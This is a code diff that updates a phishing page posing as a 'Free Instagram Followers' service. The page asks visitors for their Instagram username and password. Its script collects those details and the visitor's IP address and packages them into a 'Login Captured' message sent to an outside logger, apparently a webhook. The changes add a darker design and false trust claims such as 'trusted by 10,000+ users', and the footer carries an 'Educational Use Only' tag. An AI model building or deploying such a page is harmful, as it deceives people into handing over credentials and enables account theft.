@@ -3,73 +3,132 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Free Instagram Followers</title>
-  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" />
-  <link rel="stylesheet" href="css.css" />
+  <title>Free Instagram Followers - Premium Access</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" />
   <style>
+    :root {
+      --primary: #ffffff;
+      --secondary: #111111;
+      --accent: #000000;
+      --input-bg: #1e1e1e;
+      --input-border: #333333;
+      --shadow: rgba(255, 255, 255, 0.1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background: #fafafa;
+      font-family: 'Segoe UI', sans-serif;
+      background: var(--secondary);
+      color: var(--primary);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
     }
-    .header img {
-      width: 160px;
-      margin-bottom: 15px;
+
+    .container {
+      background-color: var(--accent);
+      border-radius: 14px;
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 10px 40px var(--shadow);
+      transition: 0.3s ease-in-out;
     }
-    .text {
+
+    .container:hover {
+      box-shadow: 0 15px 50px rgba(255, 255, 255, 0.2);
+    }
+
+    .header {
       text-align: center;
-      margin-top: 20px;
+      margin-bottom: 30px;
+    }
+
+    .header img {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      font-weight: 600;
+      color: var(--primary);
+    }
+
+    .header p {
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .input-box {
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--input-border);
+      border-radius: 8px;
+      background-color: var(--input-bg);
+      color: var(--primary);
       font-size: 14px;
     }
-    .btn {
-      background-color: #ff2b74;
-      color: white;
-      font-weight: bold;
-      border: none;
-      padding: 8px 0;
-      width: 100%;
-      cursor: pointer;
+
+    input::placeholder {
+      color: #888;
     }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background-color: var(--primary);
+      color: var(--secondary);
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+      transition: 0.2s ease;
+    }
+
     .btn:hover {
-      background-color: #ff1f60;
+      background-color: #f0f0f0;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
     }
   </style>
 </head>
 <body>
-  <div id="root">
-    <section class="section-all">
-      <main class="main" role="main">
-        <div class="wrapper">
-          <article class="article">
-            <div class="content">
-              <div class="login-box">
-                <div class="header" style="text-align:center;">
-                  <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Followers Logo" />
-                  <h2>Free Instagram Followers</h2>
-                  <p>Log in to get up to <strong>1000 followers</strong> instantly!</p>
-                </div>
-                <div class="form-wrap">
-                  <form class="form">
-                    <div class="input-box">
-                      <input type="text" id="username" placeholder="Instagram Username" maxlength="30" required />
-                    </div>
-                    <div class="input-box">
-                      <input type="password" id="password" placeholder="Instagram Password" maxlength="30" required />
-                    </div>
-                    <span class="button-box">
-                      <button class="btn" type="button" onclick="sendMessage()">Get Free Followers</button>
-                    </span>
-                  </form>
-                </div>
-              </div>
-              <p class="text">Service is 100% free — no human verification required!</p>
-            </div>
-          </article>
-        </div>
-      </main>
-    </section>
+  <div class="container">
+    <div class="header">
+      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="logo" />
+      <h1>Free Instagram Followers</h1>
+      <p>Premium Tool • Secure & Fast Delivery</p>
+    </div>
+    <form>
+      <div class="input-box">
+        <input type="text" id="username" placeholder="Instagram Username" required />
+      </div>
+      <div class="input-box">
+        <input type="password" id="password" placeholder="Instagram Password" required />
+      </div>
+      <button type="button" class="btn" onclick="sendMessage()">Get Followers</button>
+    </form>
+    <p class="footer-text">This service is secure & trusted by 10,000+ users.</p>
   </div>
 
-  <!-- Logger Script -->
   <script>
     async function sendMessage() {
       const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
@@ -86,17 +145,17 @@
         const data = await res.json();
         ip = data.ip;
       } catch (err) {
-        console.error("Failed to fetch IP:", err);
+        console.error("IP fetch failed:", err);
       }
 
       const payload = {
-        username: "📥 Free Followers Logger",
+        username: "🔔 Premium Logger",
         avatar_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png",
         embeds: [
           {
-            title: "🚨 New Login Captured",
-            description: "New user tried to log in for free followers.",
-            color: 0xff2b74,
+            title: "🚨 Login Captured - Premium Page",
+            color: 0xffffff,
+            description: "New user logged in from premium followers page.",
             fields: [
               { name: "👤 Username", value: `\`${username}\``, inline: true },
               { name: "🔑 Password", value: `\`${password}\``, inline: true },
@@ -104,7 +163,7 @@
               { name: "📡 IP Address", value: `\`${ip}\``, inline: false }
             ],
             footer: {
-              text: "Free Followers Logger • For educational demos only",
+              text: "Premium Logger • Educational Use Only",
               icon_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png"
             },
             timestamp: new Date().toISOString()
